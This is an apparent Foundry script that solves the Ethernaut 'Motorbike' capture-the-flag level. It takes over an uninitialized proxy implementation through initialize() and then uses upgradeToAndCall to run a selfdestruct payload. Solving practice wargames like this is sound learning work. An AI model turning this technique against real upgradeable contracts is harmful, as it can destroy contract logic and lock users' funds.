// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/levels/25-Motorbike/Motorbike.sol";

contract ExploitScript is Script {
    Destructive DestructiveContract;
    Motorbike level25 = Motorbike(payable(0xf564b5504774A809Aa11D8b414C8ec3aE4B79eb1));

    function run() public {
        vm.startBroadcast();
        DestructiveContract = new Destructive();
        Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
        console.log(address(engineAddress));
        engineAddress.initialize();
        console.log("Upgrader is :", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(address(DestructiveContract), encodedData);
        vm.stopBroadcast();
    }
}

contract Destructive {
    function killed() external {
        selfdestruct(address(0));
    }    
}